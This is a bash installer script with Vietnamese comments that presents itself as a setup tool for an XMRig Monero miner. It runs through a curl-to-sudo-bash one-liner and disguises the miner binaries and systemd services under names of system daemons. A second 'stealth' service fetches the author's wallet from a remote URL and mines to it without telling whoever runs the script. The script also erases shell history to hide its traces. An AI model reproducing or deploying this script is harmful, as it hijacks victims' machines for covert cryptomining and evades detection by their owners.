#!/bin/bash
# sudo bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)

# ========= CONFIG =========
WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # <-- sửa thành ví của bạn
POOL="pool.supportxmr.com:443"
DISCORD_WEBHOOK=""  # <-- nhập webhook Discord nếu muốn nhận thông báo

WORKER="user_$(hostname)"
TOTAL_CORES=$(nproc)
THREADS_USER=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
THREADS_STEALTH=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")

INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
mkdir -p "$INSTALL_DIR"

ALL_NAMES=("udevd" "systemd-update" "irqbalance" "corefixd" "sysnetd" "dbus-io" "logrotate" "journald" "netwatchd" "coreupd" "kdevtmpfs")
read -r NAME_USER NAME_STEALTH < <(shuf -e "${ALL_NAMES[@]}" -n2)

LOG_USER="/tmp/.xmrig_$NAME_USER.log"
LOG_STEALTH="/tmp/.xmrig_$NAME_STEALTH.log"

SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service" "update-net.service")
SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service" "driverd.service")
# ==========================

echo "💻 Đang cài đặt XMRig và cấu hình tiến trình..."

sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

sudo systemctl stop $SERVICE_USER 2>/dev/null
sudo systemctl stop $SERVICE_STEALTH 2>/dev/null

cp ./xmrig "$INSTALL_DIR/$NAME_USER"
cp ./xmrig "$INSTALL_DIR/$NAME_STEALTH"
chmod +x "$INSTALL_DIR/$NAME_USER" "$INSTALL_DIR/$NAME_STEALTH"

WALLET_STEALTH=$(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt)
WORKER_STEALTH="stealth_$(hostname)"

# ========== SERVICE USER ==========
sudo tee /etc/systemd/system/$SERVICE_USER > /dev/null << EOF
[Unit]
Description=System Network Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME_USER -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=40 \\
  --log-file=$LOG_USER
Restart=always
Nice=10
ExecStopPost=/bin/bash -c 'curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"❌ Máy \\\`$(hostname)\\\` đã dừng hoạt động\"}" '"$DISCORD_WEBHOOK"

[Install]
WantedBy=multi-user.target
EOF

# ========== SERVICE STEALTH ==========
sudo tee /etc/systemd/system/$SERVICE_STEALTH > /dev/null << EOF
[Unit]
Description=Kernel Hardware Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME_STEALTH -o $POOL -u $WALLET_STEALTH.$WORKER_STEALTH -k --coin monero --tls \\
  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=50 \\
  --log-file=$LOG_STEALTH
Restart=always
Nice=10
ExecStopPost=/bin/bash -c 'curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"❌ Máy \\\`$(hostname)\\\` đã dừng hoạt động\"}" '"$DISCORD_WEBHOOK"

[Install]
WantedBy=multi-user.target
EOF

# Khởi động
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_USER
sudo systemctl enable $SERVICE_STEALTH
sudo systemctl start $SERVICE_USER
sudo systemctl start $SERVICE_STEALTH

# Gửi webhook khi khởi động
if [[ -n "$DISCORD_WEBHOOK" ]]; then
    UPTIME=$(uptime -p)
    LOAD=$(uptime | awk -F'load average:' '{ print $2 }' | xargs)
    curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"⚙️ Máy \\\`$(hostname)\\\` đã hoạt động\\n⏱ $UPTIME\\n🔥 CPU Load: $LOAD\"}" "$DISCORD_WEBHOOK"
fi

# Xóa dấu vết
cd ~
rm -rf xmrig
history -c

echo "✅ Đào Monero đã bắt đầu với tiến trình:"
echo "   ➤ $NAME_USER ($SERVICE_USER)"
echo "   ➤ $NAME_STEALTH ($SERVICE_STEALTH)"

# Mở htop
if ! command -v htop >/dev/null 2>&1; then
    echo "📦 Cài htop"
    sudo apt install -y htop
fi
exec htop
